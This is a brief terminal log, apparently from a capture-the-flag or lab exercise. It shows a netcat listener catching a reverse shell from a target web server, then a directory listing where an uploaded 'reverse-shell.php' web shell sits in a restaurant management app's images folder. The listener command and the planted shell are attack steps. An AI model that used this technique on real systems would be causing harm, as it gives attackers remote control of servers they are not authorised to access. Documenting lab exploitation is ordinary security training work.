
```sh
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lvnp 443                            
listening on [any] 443 ...

connect to [10.18.21.236] from (UNKNOWN) [10.10.51.95] 35980
sh: no job control in this shell
sh-4.2$ 
sh-4.2$ 

sh-4.2$ ls -la
ls -la
total 1052
drwxr-xr-x.  2 apache apache   4096 Mar 21 21:47 .
drwxr-xr-x. 10 root   root     4096 Jul 26  2021 ..
-rw-r--r--.  1 root   root    13753 Nov 17  2017 1.PNG
-rw-r--r--.  1 root   root    23520 Dec  8  2020 47446233-clean-noir-et-gradient-sombre-image-de-fond-abstrait-.jpg
-rw-r--r--.  1 root   root   845941 Aug  1  2017 Desert.jpg
-rw-r--r--.  1 root   root    11776 Aug  1  2017 Thumbs.db
-rw-r--r--.  1 root   root      587 Aug  1  2017 base-bg.gif
-rw-r--r--.  1 root   root    80097 Aug  1  2017 head-img.jpg
-rw-r--r--.  1 root   root      668 Aug  1  2017 icon_menu.gif
-rw-r--r--.  1 root   root     3022 Aug  1  2017 logo.gif
-rw-r--r--.  1 root   root     6277 Aug  1  2017 logo2.gif
-rw-r--r--.  1 root   root    23318 Dec  8  2020 no-image-available.png
-rw-r--r--.  1 root   root    36863 Aug  1  2017 pizza-inn-map4-mombasa-road.png
-rw-r--r--.  1 apache apache     39 Mar 21 21:47 reverse-shell.php
sh-4.2$ pwd
pwd
/var/www/html/rms/images
```

```sh

```